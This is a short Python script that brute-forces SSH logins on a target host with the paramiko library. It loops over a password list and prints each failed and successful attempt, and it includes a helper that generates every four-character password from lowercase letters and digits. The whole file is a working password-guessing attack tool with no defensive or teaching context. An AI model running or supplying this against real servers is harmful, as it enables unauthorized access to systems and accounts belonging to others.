import paramiko
import itertools

def brute_force_ssh(target, username, password_list,st):
    for password in password_list:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(target, username=username, password=password)
            st.write(f"Success! Username: {username}, Password: {password}")
            ssh.close()
            return
        except paramiko.AuthenticationException:
            st.write(f"Failed attempt: {password}")
            continue
        except Exception as e:
            st.write(f"Error: {e}")
            break

def generate_passwords():
    # Simple example of generating a small password list
    chars = "abcdefghijklmnopqrstuvwxyz123456"
    return [''.join(x) for x in itertools.product(chars, repeat=4)]
